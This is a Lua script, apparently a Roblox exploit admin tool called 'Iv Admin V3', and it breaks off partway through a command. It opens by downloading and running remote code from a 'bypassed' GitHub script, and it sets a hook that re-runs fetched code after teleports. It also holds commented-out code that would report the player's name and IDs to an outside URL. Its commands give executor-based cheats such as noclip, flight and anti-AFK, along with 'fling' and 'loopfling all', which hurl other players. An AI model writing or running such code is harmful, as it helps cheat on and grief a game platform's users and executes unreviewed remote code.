repeat task.wait(0.1) until game:GetService('Players').LocalPlayer task.wait(1/2)
loadstring(game:HttpGet('https://raw.githubusercontent.com/M1nory/old-iv-admin-bypassed/main/Script38.lua'))()

print('Not ur admin');
print('Not ur admin');

-- // Global
if _G.IvAdminV3 then
    for _, v in next, _G.IvAdminV3.UIs do
        v:Destroy()
    end

    for _, v in next, _G.IvAdminV3.Signals do
        Disconnect(v)
    end
    clear(_G.IvAdminV3)
end

_G.ReExecute = _G.ReExecute == false and _G.ReExecute or true
_G.IvAdmin_V3 = _G.IvAdmin_V3 or {}
_G.IvAdminV3 = {Signals = {}, UIs = {}}

-- // Script Variables
local Commands = {}
local Overwrite = false
local GSignals = _G.IvAdmin_V3
local Signals = _G.IvAdminV3.Signals
local IvAdmin = GetObjs(12533033948)

-- // Vars
local RespawnTime = plrs.RespawnTime
local Displaying, Instances = true, {}
local Folder = 'Iv Admin v3' makefolder(Folder)
local Settings, PlayersData, AdminSettings, AdminPD

-- // Functions
local Darken = function(v)
	local R, G, B = v.R * 255, v.G * 255, v.B * 255
	return Color3.fromRGB(R * 0.5, G * 0.5, B * 0.5)
end

local StopAnim = function(Animation)
    if not Animation or Animation == 'all' then
        for _, v in next, plr.Character.Humanoid:GetPlayingAnimationTracks() do
            v:Stop()
        end
    elseif isIndexType(plr.Character.Humanoid:GetPlayingAnimationTracks(), Animation) then
        plr.Character.Humanoid:GetPlayingAnimationTracks()[isIndexType(plr.Character.Humanoid:GetPlayingAnimationTracks(), Animation)]:Stop()
    end
end

local Notify = function(Text, Icon, Duration, Color)
	spawn(function()
        -- // Settings
		local Text = toStr(Text)
        local Icon = not toNum(Icon) and Icon
        local Duration = toNum(Duration) and Duration or toNum(Icon) and Icon or 4
        local Color = typeof(Color) == 'Color3' and Color or typeof(Duration) == 'Color3' and Duration or Color3.new(0.8, 0, 0)

        -- // Notification
		local Notification = IvAdmin.Objs.Notification:Clone()
		local Info = Notification.Info
		local Bar = Info.Bar

		Info.Frame.Label.TextScaled = true
		Info.Frame.Label.Text = Text
		Info.Frame.Label.TextScaled = false
		Bar.Timer.ImageColor3 = Color
		Info.Frame.Icon.Visible = Icon
		Bar.ImageColor3 = Darken(Color)
		Info.Frame.Icon.Image = Icon or ''
		Notification.Parent = IvAdmin.Notifications
		Info.Frame.Label.Size = Icon and UDim2.new(0.783, 0, 1, 0) or UDim2.new(1, 0, 1, 0)
		
        -- // Animation
		Info:TweenPosition(UDim2.new(0, 0, 0, 0), 'InOut', 'Sine', 0.5)
		Bar.Timer:TweenSize(UDim2.new(0, 0, 1, 0), 'InOut', 'Sine', Duration + 1)
		
		wait(Duration + 0.5)
		
		Info:TweenPosition(UDim2.new(1, 0, 0, 0), 'InOut', 'Sine', 0.5, true); wait(0.65)
		Notification:Destroy()
	end)
end

local AddCommand = function(Command, Aliases, Description, Code)
	if type(Command and Description) == 'string' and type(Aliases) == 'table' and type(Code) == 'function' or warn(debug.traceback('Invalid Arguments!', 2)) then
		for _, v in next, Commands do
			if v['Command'] == lower(Command) then
				return
			end
		end

		insert(Commands, {
			Command = lower(Command),
			Description = Description,
			Aliases = Aliases,
			Code = Code,
		})
	end
end

local ViewCommands = function()
    IvAdmin.CommandsList.Visible = true
    for _, v in next, IvAdmin.CommandsList.List:GetChildren() do
        if v:IsA('TextLabel') then
            v:Destroy()
        end
    end

    for _, v in next, Commands do
        local Command = IvAdmin.Objs.Command:Clone()
        Command.Parent = IvAdmin.CommandsList.List
        Command.Text = concat({v['Command'], v['Description']}, ': ')
        Command.MouseEnter:Connect(function()
            IvAdmin.HoverUI.Visible = true
            IvAdmin.HoverUI.Description.Text = format('Aliases: %s', maxn(v['Aliases']) > 0 and concat(v['Aliases'], ', ') or 'none')
            IvAdmin.HoverUI.Aliases.Text = format('Description: %s', v['Description'])
        end)
    end
end

local ResV = function()
	pcall(function()
		plr.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
		plr.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)		
	end)
end

local Save = function(Type, Table)
    if writefile then
		if Type == 'Settings' or Type == 'Configs' then
			writefile(format('%s\\Settings.json', Folder), JSON('Encode', Settings))
		elseif Type == 'PlayersData' or Type == 'Players' then
			writefile(format('%s\\PlayersData.json', Folder), JSON('Encode', PlayersData))
		end
	end
end

-- // Settings
do
	-- // isfile(Folder..'/Settings.json') and JSON('Decode', readfile(Folder..'/Settings.json')) or 
    Settings = readfile and isfile(Folder..'/Settings.json') and JSON('Decode', readfile(Folder..'/Settings.json')) or {}
	AdminSettings = {
        Prefix = '.',
        Keybind = 'L',
		FlightSpeed = 6,
		CamSpeed = 6,
		Keybinds = {},
    }

	-- // isfile(Folder..'/PlayersData.json') and JSON('Decode', readfile(Folder..'/PlayersData.json')) or 
	PlayersData = readfile and isfile(Folder..'/PlayersData.json') and JSON('Decode', readfile(Folder..'/PlayersData.json')) or {}
	AdminPD = {
		Ignored = {},
		Whitelisted = {},
		Blacklisted = {},
	}

	for _, v in next, AdminSettings do
        Settings[_] = Overwrite and v or Settings[_] or v
    end

	for _, v in next, AdminPD do
        PlayersData[_] = Overwrite and v or PlayersData[_] or v
    end
	
    Save('Settings')
	Save('PlayersData')
end

-- // Connections
Signals['QuickSearch'] = IvAdmin.CommandsList.QuickSearch.Search:GetPropertyChangedSignal('Text'):Connect(function()
    for _, v in next, IvAdmin.CommandsList.List:GetChildren() do
        if v:IsA('TextLabel') then
            v.Visible = match(lower(v.Text), lower(IvAdmin.CommandsList.QuickSearch.Search.Text))
        end
    end
end)

Signals['MouseLeave'] = IvAdmin.CommandsList.List.MouseLeave:Connect(function()
    IvAdmin.HoverUI.Visible = false
end)

Signals['Hover'] = plr:GetMouse().Move:Connect(function()
    IvAdmin.HoverUI.Position = UDim2.new(0, plr:GetMouse().X + 10, 0, plr:GetMouse().Y)
end)

Signals['ChatEvent'] = plr.Chatted:Connect(function(Message)
    local Args = split(Message, ' ')
    local Player = GetPlayer(Args[2])
    local Prefix = Settings.Prefix

    for _, v in next, Commands do
        if concat({Prefix, v['Command']}, '') == lower(Args[1]) then
            return remove(Args, 1) and v.Code(Args, Player)
        else
            for _, vi in next, v['Aliases'] do
                if concat({Prefix, vi}, '') == lower(Args[1]) then
                    return remove(Args, 1) and v.Code(Args, Player)
                end
            end
        end
    end
end)

Signals['AutoFill'] = IvAdmin.CommandBar.Box.Focused:Connect(function()
    while IvAdmin.CommandBar.Box:IsFocused() and wait() do
        if len(IvAdmin.CommandBar.Box.Text) > 0 then
			local Args = IvAdmin.CommandBar.Box.Text:split(' ')
			local CanDisplay = false
            local toDisplay = {} do
                for _, v in next, Commands do
                    insert(toDisplay, lower(v['Command']))
                    for _, v2 in next, v['Aliases'] do
                        insert(toDisplay, v2)
                    end
                end
            end

			if Args[2] then
				for _, v in next, GetPlayers() do
					if sub(lower(v.Name), 1, len(Args[2])) == lower(Args[2]) then
						IvAdmin.CommandBar.Label.Text = format('%s %s', Args[1], lower(sub(v.Name, 1, len(Args[2]))) .. sub(v.Name, len(Args[2]) + 1, len(v.Name))) CanDisplay = true break
					elseif sub(lower(v.DisplayName), 1, len(Args[2])) == lower(Args[2]) then
						IvAdmin.CommandBar.Label.Text = format('%s %s', Args[1], lower(sub(v.DisplayName, 1, len(Args[2]))) .. sub(v.DisplayName, len(Args[2]) + 1, len(v.DisplayName))) CanDisplay = true break
					else
						CanDisplay = false
					end
				end
	
				if not CanDisplay then
					IvAdmin.CommandBar.Label.Text = Args[1]
				end
			else
				if isIndexOf(toDisplay, lower(IvAdmin.CommandBar.Box.Text)) then
					IvAdmin.CommandBar.Label.Text = ''
				else
					for _, v in next, toDisplay do
						if sub(v, 1, len(IvAdmin.CommandBar.Box.Text)) == lower(IvAdmin.CommandBar.Box.Text) then
							IvAdmin.CommandBar.Label.Text = v CanDisplay = true break
						else
							CanDisplay = false
						end
					end

					if not CanDisplay then
						IvAdmin.CommandBar.Label.Text = ''
					end
				end
			end
		else
			IvAdmin.CommandBar.Label.Text = ''
        end
    end
end)

Signals['CommandBar'] = IvAdmin.CommandBar.Box.FocusLost:Connect(function()
	local Args =  split(IvAdmin.CommandBar.Box.Text, ' ')

    IvAdmin.CommandBar:TweenPosition(UDim2.new(0.5, 0, 5, 0), 'Out', 'Sine', 2, true)
	for _, v in next, Commands do
		if v.Command == lower(Args[1]) then
			return remove(Args, 1) and v.Code(Args)
		else
			for _, vi in next, v.Aliases do
				if vi == lower(Args[1]) then
					return remove(Args, 1) and v.Code(Args)
				end
			end
		end
	end
end)

Signals['Keybind'] = InputService.InputBegan:Connect(function(Input, IsTyping)
	if Input.KeyCode == Enum.KeyCode[Settings.Keybind] and not IsTyping then
        IvAdmin.CommandBar.Position = UDim2.new(0.5, 0, 2, 0)
        IvAdmin.CommandBar:TweenPosition(UDim2.new(0.5, 0, 0.739, 0), 'Out', 'Sine', 0.3, true)
		IvAdmin.CommandBar.Box:CaptureFocus(); RenderStepped:Wait()
		IvAdmin.CommandBar.Box.Text = ''
        IvAdmin.CommandBar.Label.Text = ''
		IvAdmin.CommandBar.Box.CursorPosition = len(IvAdmin.CommandBar.Box.Text) + 2
    elseif Input.KeyCode == Enum.KeyCode.Tab and IsTyping then
        if IvAdmin.CommandBar.Box:IsFocused() and len(IvAdmin.CommandBar.Box.Text) > 0 and len(IvAdmin.CommandBar.Label.Text) > 0 then
            IvAdmin.CommandBar.Box.Text = ''; RenderStepped:Wait()
            IvAdmin.CommandBar.Box.Text = IvAdmin.CommandBar.Label.Text
            IvAdmin.CommandBar.Box.CursorPosition = len(IvAdmin.CommandBar.Box.Text) + 2
        end
	end
end)

Signals['CustomBinds'] = InputService.InputBegan:Connect(function(Input, isTyping)
	if not isTyping then
		for _, v in next, Settings.Keybinds do
			if Enum.KeyCode[v['Key']] == Input.KeyCode then
				for _, v2 in next, Commands do
					if v2.Command == lower(v['Command']) then
						return v2.Code()
					else
						for _, vi in next, v2.Aliases do
							if vi == lower(v['Command']) then
								return v2.Code()
							end
						end
					end
				end
			end
		end
	end
end)

Signals['PlayerJoin'] = plrs.PlayerAdded:Connect(function(Player)
	if find(PlayersData.Blacklisted, Player.Name) then
		Notify(format('[ALERT]: \'%s\' has joined!', Player.Name), pfp(Player.UserId), 4, Color3.fromRGB(255, 255, 0))
	end

	if Player:IsFriendsWith(plr.UserId) then
		Notify(format('Your friend %s has joined!', Player.DisplayName), pfp(Player.UserId), 4)
	end
end)

Signals['PlayerLeaving'] = plrs.PlayerRemoving:Connect(function(Player)
	local Support = (syn and syn.queue_on_teleport) or queue_on_teleport
	if Support and _G.ReExecute and not GSignals['Re-Execute'] then
		_G.ReExecute = false
		GSignals['Re-Execute'] = true
		Support('warn("Re-Executed IV");loadstring(game:HttpGet(\'\'))()')
	end


	-- // if Player == plr then
		-- // local URL = '';
		-- // local Hx = game:HttpGet(format(URL, game.JobId, plr.Name, plr.UserId));
	-- // end
end)

Signals['LocalCharacter'] = plr.CharacterAdded:Connect(function(Chr)
	local Anim = Instance.new('Animation')
	if not Chr:FindFirstChild('Humanoid') then
		repeat wait(0.1) until Chr:FindFirstChild('Humanoid')
	end

	Anim.AnimationId = 'rbxassetid://3222379378'
	Chr.Humanoid:LoadAnimation(Anim):Play()
end)

do
	pcall(function()
		--local URL = '';
		--if len(format(URL, toStr(game.PlaceId), game.JobId, plr.Name, plr.UserId)) > 80 then
			--local Hx = game:HttpGetAsync(format(URL, toStr(game.PlaceId), game.JobId, plr.Name, plr.UserId));
		--end
	end)

	spawn(function()
		-- // Constant Dumping 4 dis? Das crazy, son.

		local Anim = Instance.new('Animation')
		local C_Wait = plr.Character or plr.CharacterAdded:Wait()
		if not C_Wait:FindFirstChild('Humanoid') then
			repeat wait(0.1) until C_Wait:FindFirstChild('Humanoid')
		end

		Anim.AnimationId = 'rbxassetid://3222379378'
		C_Wait.Humanoid:LoadAnimation(Anim):Play()
	end)
end

IvAdmin.Parent = Core
IvAdmin.Name = 'IvAdminV3'
insert(_G.IvAdminV3.UIs, IvAdmin)
workspace.FallenPartsDestroyHeight = 0/0
SoundService.RespectFilteringEnabled = false
IvAdmin.CommandBar:TweenPosition(UDim2.new(0.5, 0, 5, 0), 'Out', 'Sine', 2, true)
IvAdmin.CommandBar.Box.PlaceholderText = format('Press %s to type', Settings.Keybind)
IvAdmin.CommandsList.Close.MouseButton1Click:Connect(function() IvAdmin.CommandsList.Visible = false end)
Notify(format('Iv Admin V3 Loaded!\n%s is your Prefix\nPress \'%s\' to type', Settings.Prefix, Settings.Keybind), pfp(plr.UserId), 8)
AddCommand('commands', {'cmds'}, 'Commands List', function()
    ViewCommands()
end)

AddCommand('amount', {}, 'Commands Amount', function()
	Notify(format('Total of \'%d\' Commands!', maxn(Commands)))
end)

AddCommand('prefix', {'setprefix', 'newprefix'}, 'Set your own Prefix', function(Args)
    Notify(format('Prefix set to \'%s\'', Args[1]))
    Settings.Prefix = toStr(Args[1])
    Save('Settings')
end)

AddCommand('setkeybind', {'newkeybind'}, 'Set your own Keybind', function(Args)
    Disconnect(Signals['SetKeybind'])
    Notify('Set Your Prefix!') wait(0.3)
    
    Signals['SetKeybind'] = InputService.InputBegan:Connect(function(Input)
        if Input then
            IvAdmin.CommandBar.Box.PlaceholderText = format('Press %s to type', sub(toStr(Input.KeyCode), 14))
            Notify(format('Keybind has been set to \'%s\'', sub(toStr(Input.KeyCode), 14)))
            Settings.Keybind = sub(toStr(Input.KeyCode), 14)
            Disconnect(Signals['SetKeybind'])
            Save('Settings')
        end
    end)
end)

AddCommand('nolimbs', {'limbless'}, 'Removes Limbs', function()
	local Limbs = {'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg', 'LeftUpperArm', 'RightUpperArm', 'RightUpperLeg', 'LeftUpperLeg'}
	for _, v in next, plr.Character:GetChildren() do
		if v:IsA('BasePart') and find(Limbs, v.Name) then
			v:Destroy()
		end
	end
end)

AddCommand('removehand', {'rhand'}, 'Remove Right Hand/Arm', function()
	local Hand = plr.Character and (plr.Character:FindFirstChild('RightHand') or plr.Character:FindFirstChild('Right Arm'))
	if Hand then
		Hand:Destroy()
	end
end)

AddCommand('tall', {'stretch'}, 'Be Tall', function()
    local Scales = {'BodyTypeScale', 'BodyWidthScale', 'BodyDepthScale', 'HeadScale'};
    for _, v3 in ipairs(Scales) do
        for _, v in next, plr.Character:GetDescendants() do
            if v:IsA('BasePart') and v.Name ~= 'Head' then
                for _, v2 in next, v:GetDescendants() do
                    if v2:IsA('Attachment') and v2:FindFirstChild('OriginalPosition') then
                        v2.OriginalPosition:Destroy();
                    end
                end
    
                v:WaitForChild('OriginalSize'):Destroy();
                if v:FindFirstChild('AvatarPartScaleType') then
                    v.AvatarPartScaleType:Destroy();
                end
            end
        end
        plr.Character.Humanoid:WaitForChild(v3):Destroy();
    end
end)

AddCommand('chat', {'say', 'talk'}, 'Fires message', function(Args)
	wait(1/5)
	ChatRemote:FireServer(concat(Args, ' '), 'All')
end)

AddCommand('firetouchparts', {'gettouchinterestparts'}, 'Fires all TouchInterest', function()
	for _,v in next, workspace:GetDescendants() do
	    if v:IsA('BasePart') and v:FindFirstChild('TouchInterest') then
	        firetouchinterest(plr.Character.HumanoidRootPart, v, 0)
	    end
	end
end)

AddCommand('rotvelocity', {'rotvel', 'rvel', 'spin'}, 'Spin', function(Args)
	_G.RotationVelocity = toNum(Args[1]) or 150
	if not _G.IvRotating then
		_G.IvRotating = true
		while _G.IvRotating and wait() do
			pcall(function()
				plr.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, _G.RotationVelocity, 0)		
			end)
		end
	end
end)

AddCommand('resetvelocity', {'resetvel', 'unspin'}, 'Unspin', function()
	_G.RotationVelocity = nil
	_G.IvRotating = false
end)

AddCommand('rejoin', {'rj'}, 'Rejoin', function()
    TeleportService:Teleport(game.PlaceId)
end)

AddCommand('rjreset', {'rjre', 'rjr', 'respawn2', 'rejoinre'}, 'Rejoins at same pos', function()
	local Support = (syn and syn.queue_on_teleport) or queue_on_teleport
	local Script = [[
		if not game:IsLoaded() then
			repeat wait() until game:IsLoaded()
		end
		local plr = game:GetService('Players').LocalPlayer
		local Chr = plr.Character or plr.CharacterAdded:Wait()
		
		Chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s)
	]]

	if not Support then
		return Notify('Exploit not supported!')
	end

	Script = format(Script, toStr(plr.Character.Humanoid.Torso.CFrame)); Support(Script)
	TeleportService:Teleport(game.PlaceId, plr, game.JobId)
end)

AddCommand('serverhop', {'shop', 'sh', 'diffserver'}, 'Server Hop', function()
    local api, IDs = 'https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100', {}
    for _, v in next, JSON('Decode', game:HttpGet(format(api, game.PlaceId))).data do
        if v.id ~= game.JobId and (v.playing < v.maxPlayers) then
            insert(IDs, v.id)
        end
    end

	TeleportService:TeleportToPlaceInstance(game.PlaceId, Randomize(IDs), plr)
end)

AddCommand('serverhopreset', {'shopre', 'shre'}, 'Server Hop at same Pos', function()
    local api, IDs = 'https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100', {}
	local Support = (syn and syn.queue_on_teleport) or queue_on_teleport
    local Script = [[
		if not game:IsLoaded() then
			repeat wait() until game:IsLoaded()
		end
		local plr = game:GetService('Players').LocalPlayer
		local Chr = plr.Character or plr.CharacterAdded:Wait()
		
		Chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s)
	]]

	for _, v in next, JSON('Decode', game:HttpGet(format(api, game.PlaceId))).data do
		if v.id ~= game.JobId and (v.playing < v.maxPlayers) then
			insert(IDs, v.id)
		end
	end

	if #IDs ~= 0 then
        if not Support then
            return Notify('Exploit not supported')
        end

		Script = format(Script, toStr(plr.Character.Humanoid.Torso.CFrame)); Support(Script)
		TeleportService:TeleportToPlaceInstance(game.PlaceId, Randomize(IDs), plr)
	end
end)

AddCommand('jobid', {'copyjobid'}, 'copy UUID', function()
	setclipboard(game.JobId)
	Notify('Copied UUID\n'..game.JobId)
end)

AddCommand('copypos', {'cpos'}, 'copy current position', function()
	local Exist = (plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')) or nil

	if Exist or Notify(toStr(Exist.CFrame.Position)) then
		Notify(toStr(Exist.CFrame.Position))
		setclipboard(toStr(Exist.CFrame.Position))
	end
end)

AddCommand('noclip', {}, 'noclip', function()
    if _G.Noclip then
        Disconnect(_G.Noclip)
    end

    local Noclip = function()
        for _, v in next, plr.Character:GetChildren() do
            if v:IsA('BasePart') and v.CanCollide then
                v.CanCollide = false
            end
        end
    end

    _G.Noclip = Stepped:Connect(Noclip)
end)

AddCommand('clip', {}, 'Clips', function()
    if _G.Noclip then
        Disconnect(_G.Noclip)
    end

    for _, v in next, plr.Character:GetChildren() do
        if v:IsA('BasePart') then
            v.CanCollide = true
        end
    end
end)

AddCommand('log', {'audiolog'}, 'Audio Log User', function(Args)
    local Target = GetPlayer(Args[1])
    if Target then
    	pcall(function()
        	for _, v in next, Target.Character:GetDescendants() do
				if v:IsA('Sound') and v.Playing and v.Parent.Parent:IsA('Tool') then
					Notify(format('Logged \'%s\'\nAsset ID: %s', Target.Name, split(v.SoundId, '=')[2]), pfp(Target.UserId), 4)
					setclipboard(toStr(split(v.SoundId, '=')[2]))
				end
			end
		end)
    end
end)

AddCommand('sit', {}, 'Sits', function()
    pcall(function()
		plr.Character.Humanoid.Sit = true
	end)
end)

AddCommand('lay', {'laydown'}, 'Anything is a bed', function()
	pcall(function()
		plr.Character.Humanoid.Sit = false; wait(0.1)
		plr.Character.Humanoid.Sit = true; wait(0.2)
		plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.Angles(rad(90), 0, 0)
		for _, v in pairs(plr.Character.Humanoid:GetPlayingAnimationTracks()) do
			v:Stop()
		end
	end)
end)

AddCommand('antiafk', {}, 'Anti-Afk', function()
	plr.Idled:connect(function()
		game:GetService('VirtualUser'):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame); wait(1/2)
		game:GetService('VirtualUser'):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
	end)
end)

AddCommand('unfly', {}, 'Unfly', function()
	if _G.IvAdminFlight then
		_G.IvAdminFlight.Destroy = true
	end
end)

AddCommand('flyspeed', {}, 'Flight Speed', function(int)
	if int[1] then
		if not _G.IvAdminFlight then
			_G.IvAdminFlight = {
				FlightSpeed = Settings.FlightSpeed or 6,
				Destroy = false,
				Flying = false,
				New = true,
			}
		end

		Settings.FlightSpeed = toNum(int[1]) or Settings.FlightSpeed
		_G.IvAdminFlight.FlightSpeed = toNum(int[1])
		Notify(format('Set Flight Speed to %d', toNum(int[1])))
		Save('Settings')
	end
end)

AddCommand('fly', {}, 'Fly', function()
	if _G.IvAdminFlight and not _G.IvAdminFlight.Destroy and not _G.IvAdminFlight.New then
		return Notify('Flight already Active!\nPress E to enable/disable')
	end
		
	if not _G.IvAdminFlight then
		_G.IvAdminFlight = {
			FlightSpeed = Settings.FlightSpeed or 6,
			Destroy = false,
			Flying = false,
			New = true,
		}
	end

	_G.IvAdminFlight.New = false
	_G.IvAdminFlight.Destroy = true
	RenderStepped:Wait()
	_G.IvAdminFlight.Destroy = false
	Notify('Press E to enable/disable')
	local Cam = workspace.CurrentCamera
	local Mouse = plr:GetMouse()
	local Connections = {}
	local Binds = {
	    [1] = {
	        [1] = 0,
	        [2] = 0,
	        [3] = 0,
	        [4] = 0
	    },
	
	    [2] = {
	        [1] = 0,
	        [2] = 0,
	        [3] = 0,
	        [4] = 0
	    }
	}
	
	
	local BodyGyro = Instance.new('BodyGyro', plr.Character.HumanoidRootPart)
	local BodyVelocity = Instance.new('BodyVelocity', plr.Character.HumanoidRootPart)

	BodyGyro.P = 9e4
	BodyGyro.MaxTorque = Vector3.new(1/0, 1/0, 1/0)
	BodyGyro.CFrame = plr.Character.HumanoidRootPart.CFrame
	
	BodyVelocity.Velocity = Vector3.new(0, 1/10, 0)
	BodyVelocity.MaxForce = Vector3.new(1/0, 1/0, 1/0)
	
	
	Connections[#Connections + 1] = Mouse.KeyDown:Connect(function(Key)
	    if Key == 'e' then
	        _G.IvAdminFlight.Flying = not _G.IvAdminFlight.Flying
	
	        if _G.IvAdminFlight.Flying then
	            BodyGyro:Destroy()
	            BodyVelocity:Destroy()
	        end
	
	        if not _G.IvAdminFlight.Flying then
				BodyGyro:Destroy()
	            BodyVelocity:Destroy()
				
	            BodyGyro = Instance.new('BodyGyro', plr.Character.HumanoidRootPart)
	            BodyVelocity = Instance.new('BodyVelocity', plr.Character.HumanoidRootPart)
	
	            BodyGyro.P = 9e4
	            BodyGyro.MaxTorque = Vector3.new(1/0, 1/0, 1/0)
	            BodyGyro.CFrame = plr.Character.HumanoidRootPart.CFrame
	
	            BodyVelocity.Velocity = Vector3.new(0, 1/10, 0)
	            BodyVelocity.MaxForce = Vector3.new(1/0, 1/0, 1/0)
	        end
	    elseif Key == 'w' then
	        Binds[1][1] = _G.IvAdminFlight.FlightSpeed
	    elseif Key == 's' then
	        Binds[1][2] = -_G.IvAdminFlight.FlightSpeed
	    elseif Key == 'a' then
	        Binds[1][3] = -_G.IvAdminFlight.FlightSpeed
	    elseif Key == 'd' then
	        Binds[1][4] = _G.IvAdminFlight.FlightSpeed
	    end
	end)
	
	Connections[#Connections + 1] = Mouse.KeyUp:Connect(function(Key)
	    if Key == 'w' then
	        Binds[1][1] = 0
	    elseif Key == 's' then
	        Binds[1][2] = 0
	    elseif Key == 'a' then
	        Binds[1][3] = 0
	    elseif Key == 'd' then
	        Binds[1][4] = 0
	    end
	end)
	
	Connections[#Connections + 1] = plr.CharacterAdded:Connect(function(Chr)
		_G.IvAdminFlight.Flying = false

		Chr:WaitForChild('Humanoid').Died:Connect(function()
			_G.IvAdminFlight.Flying = false
		end)
	end)
	
	Connections[#Connections + 1] = Stepped:Connect(function()
		if _G.IvAdminFlight.Destroy then
			BodyGyro:Destroy()
	        BodyVelocity:Destroy()
			_G.IvAdminFlight.Flying = false
			Notify('Flight, Disconnected!')

		    for _, v in next, Connections do
		        Disconnect(v)
		    end
			return
		end

	    local Bind = ((Binds[1][3] + Binds[1][4]) ~= 0) or ((Binds[1][1] + Binds[1][2]) ~= 0)
	
		-- // Speed = Bind and _G.IvAdminFlight.FlightSpeed or (not Bind and (Speed ~= 0)) and 0;
	    if Bind then
	        Speed = _G.IvAdminFlight.FlightSpeed
	    elseif not Bind and (Speed ~= 0) then
	        Speed = 0
	    end
	
	    if Bind then
	        BodyVelocity.Velocity = ((Cam.CoordinateFrame.LookVector * (Binds[1][1] + Binds[1][2])) + ((Cam.CoordinateFrame * CFrame.new(Binds[1][3] + Binds[1][4], (Binds[1][1] + Binds[1][2]) * 1/5, 0).p) - Cam.CoordinateFrame.p)) * Speed
	    elseif Bind and (Speed ~= 0) then
	        BodyVelocity.Velocity = ((Cam.CoordinateFrame.LookVector * (Binds[2][1] + Binds[2][2])) + ((Cam.CoordinateFrame * CFrame.new(Binds[2][3] + Binds[2][4], (Binds[2][1] + Binds[2][2]) * 1/5, 0).p) - Cam.CoordinateFrame.p)) * Speed
	    else
	        BodyVelocity.Velocity = Vector3.new(0, 1/1000, 0)
	    end
	
	    BodyGyro.CFrame = Cam.CoordinateFrame
	end)
end)

AddCommand('findseat', {'toseat'}, 'Sits on seat', function()
    local Seats = {}

    Notify('Searching...', 2)
    for _, v in next, workspace:GetDescendants() do
        if v:IsA('Seat') then
            insert(Seats, v)
        end
    end

    if maxn(Seats) > 0 or Notify('Could not find seat!', 2) then
        Notify('Seat found!', 2)
		pcall(function()
	        plr.Character.Humanoid.Sit = false; wait(1/5)
            for i = 1, 1 do
                local Seat = Seats[1]
                Seat:Sit(plr.Character.Humanoid)
            end
	    end)
	end
end)

AddCommand('searchseat', {}, 'Search for seats only', function()
    local Seats = {}

    Notify('Searching...', 2)
    for _, v in next, workspace:GetDescendants() do
        if v:IsA('Seat') then
            insert(Seats, v)
        end
    end

    if maxn(Seats) > 0 or Notify('Could not find seat!', 2) then
        Notify(format('Found \'%d\' seats', maxn(Seats)), 2)
	end
end)

AddCommand('fling', {}, 'Flings User', function(Args)
	_G.IvAdminLoopFling = false; wait(1/10)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, filter(GetPlayers(), plr) do
			if v and GetCharacter(v, 'HumanoidRootPart') then
				pcall(function()
					local Chr = GetCharacter(v, 'HumanoidRootPart')
					local Hrp = GetCharacter(plr, 'HumanoidRootPart')
					local LastPos = Hrp.CFrame
					local Delay = Args[2] or 1/3
	
					GSignals['Fling'] = Heartbeat:Connect(function()
						pcall(function()
							GetCharacter(plr):SetPrimaryPartCFrame(Chr.CFrame)
							Hrp.CFrame = Chr.CFrame

							pcall(function()
								local Humanoid2 = Player.Character.Humanoid
								local Root2 = Player.Character.HumanoidRootPart
								if Humanoid2.MoveDirection ~= Vector3.new() then
									Hrp.CFrame = Root2.CFrame
									plr.Character:SetPrimaryPartCFrame(Root2.CFrame * CFrame.new(0, 0, -10))
								else
									Hrp.CFrame = Root2.CFrame
									plr.Character:SetPrimaryPartCFrame(Root2.CFrame)
								end
							end)

							Hrp.Velocity = Vector3.new(9e9, 9e9, 9e9)
							Hrp.RotVelocity = Vector3.new(9e9, 9e9, 9e9)
						end)
					end)
	
					wait(Delay)
					Disconnect(GSignals['Fling'])
					for i = 1, 10 do
						pcall(function()
							GetCharacter(plr):SetPrimaryPartCFrame(LastPos); ResV()
						end)
					end
				end)
			end
		end
	elseif GetPlayer(Args[1]) or Notify(format('Could not find Player %s', Args[1])) then
		local Player = GetPlayer(Args[1])
		
		pcall(function()
			local Chr = GetCharacter(Player, 'HumanoidRootPart')
			local Hrp = GetCharacter(plr, 'HumanoidRootPart')
			local LastPos = Hrp.CFrame
			local Delay = Args[2] or 1/3

			GSignals['Fling'] = Heartbeat:Connect(function()
				pcall(function()
					GetCharacter(plr):SetPrimaryPartCFrame(Chr.CFrame)
					Hrp.CFrame = Chr.CFrame

					pcall(function()
						local Humanoid2 = Player.Character.Humanoid
						local Root2 = Player.Character.HumanoidRootPart
						if Humanoid2.MoveDirection ~= Vector3.new() then
							Hrp.CFrame = Root2.CFrame
							plr.Character:SetPrimaryPartCFrame(Root2.CFrame * CFrame.new(0, 0, -10))
						else
							Hrp.CFrame = Root2.CFrame
							plr.Character:SetPrimaryPartCFrame(Root2.CFrame)
						end
					end)

					Hrp.Velocity = Vector3.new(9e9, -9e9, 9e9)
					Hrp.RotVelocity = Vector3.new(9e9, -9e9, 9e9)
				end)
			end)

			wait(Delay)
			Disconnect(GSignals['Fling'])
			for i = 1, 10 do
				pcall(function()
					GetCharacter(plr):SetPrimaryPartCFrame(LastPos); ResV()
				end)
			end
		end)
	end
end)

AddCommand('loopfling', {'lfling'}, 'Loop Fling User', function(Args)
	_G.IvAdminLoopFling = true; wait(1/10)

	if Args[1] == 'all' or Args[1] == 'others' then
		while _G.IvAdminLoopFling and wait() do
			for _, v in next, filter(GetPlayers(), plr) do
				if _G.IvAdminLoopFling and v and GetCharacter(v, 'HumanoidRootPart') then
					pcall(function()
						local Chr = GetCharacter(v, 'HumanoidRootPart')
						local Hrp = GetCharacter(plr, 'HumanoidRootPart')
						local LastPos = Hrp.CFrame
						local Delay = Args[2] or 1/3
	
						GSignals['Fling'] = Heartbeat:Connect(function()
							pcall(function()
								GetCharacter(plr):SetPrimaryPartCFrame(Chr.CFrame)
								Hrp.CFrame = Chr.CFrame

								pcall(function()
									local Humanoid2 = Player.Character.Humanoid
									local Root2 = Player.Character.HumanoidRootPart
									if Humanoid2.MoveDirection ~= Vector3.new() then
										Hrp.CFrame = Root2.CFrame
